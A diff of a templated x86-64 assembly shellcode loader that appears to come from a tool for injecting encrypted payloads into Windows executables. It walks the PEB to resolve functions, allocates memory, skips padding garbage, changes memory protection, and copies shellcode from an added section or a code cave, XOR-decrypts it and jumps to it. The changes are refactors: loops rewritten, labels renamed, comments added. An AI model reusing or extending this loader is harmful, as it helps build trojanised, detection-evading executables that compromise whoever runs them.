@@ -144,9 +144,7 @@ entry:
       mov {{.RegN.r15}}, [{{.RegV.r8}}]
     {{end}}
   {{end}}
-
 {{else}}
-
   // get pointer to the PEB
   xor {{.Reg.rax}}, {{.Reg.rax}}
   mov {{.Reg.rax}}, 0x60
@@ -168,8 +166,7 @@ entry:
     add {{.RegV.r8}}, {{hex .CreateThread}}
     mov {{.RegN.r15}}, [{{.RegV.r8}}]
   {{end}}
-
-{{end}}
+{{end}} // LackProcedure
 
   // allocate memory for shellcode
   xor rcx, rcx
@@ -198,7 +195,7 @@ entry:
   add {{.RegV.rax}}, {{.Reg.r9}}
   add {{.RegV.rax}}, {{.Reg.r10}}
   add {{.RegV.rax}}, {{.Reg.r11}}
-  next1:
+ loop_padding:
   call xor_shift
 push rax
   mov rax, {{.RegV.rax}}
@@ -207,10 +204,7 @@ pop rax
   // check padding garbage is finish
   inc {{.RegV.rdx}}
   dec {{.RegV.rcx}}
-  test {{.RegV.rcx}}, {{.RegV.rcx}}
-  jz break1
-  jmp next1
-  break1:
+  jnz loop_padding
 
   // adjust memory region protect
   sub rsp, 0x10 // for store old protect
@@ -225,23 +219,24 @@ pop rax
 
 // read shellcode from extended section or code cave
 {{if .SectionMode}}
-  // extract encrypted shellcode from extended section
+  // save rsi and rdi
   push rsi
   push rdi
+
+  // extract encrypted shellcode from extended section
   mov rsi, {{.RegN.rdi}}
   add rsi, {{hex .SectionOffset}}
   mov rdi, [rsp + 0x10]
   add rdi, {{hex .EntryOffset}}
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
-  next2:
+ loop_extract:
   movsb
   inc rsi
   // check extract shellcode is finish
   dec {{.RegV.rcx}}
-  test {{.RegV.rcx}}, {{.RegV.rcx}}
-  jz break2
-  jmp next2
-  break2:
+  jnz loop_extract
+
+  // restore rdi and rsi
   pop rdi
   pop rsi
 
@@ -250,7 +245,7 @@ pop rax
   mov {{.RegV.rdx}}, [rsp]
   add {{.RegV.rdx}}, {{hex .EntryOffset}}
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
-  next3:
+ loop_decrypt:
   mov {{.RegV.r8}}, [{{.RegV.rdx}}]
   xor {{.RegV.r8}}, {{.RegV.rax}}
   mov [{{.RegV.rdx}}], {{.RegV.r8}}
@@ -259,18 +254,14 @@ pop rax
   // check decrypt shellcode is finish
   add {{.RegV.rdx}}, 8
   sub {{.RegV.rcx}}, 8
-  test {{.RegV.rcx}}, {{.RegV.rcx}} // TODO improve it
-  jz break3
-  jmp next3
-  break3:
-
+  jnz loop_decrypt
 {{else}}
   // extract encrypted shellcode from code cave
   mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
   mov {{.RegN.rdi}}, [rsp]
   add {{.RegN.rdi}}, {{hex .EntryOffset}}
   {{STUB CodeCaveMode STUB}}
-{{end}}
+{{end}} // SectionMode
 
   // get the shellcode entry point
   mov {{.RegV.rax}}, [rsp]
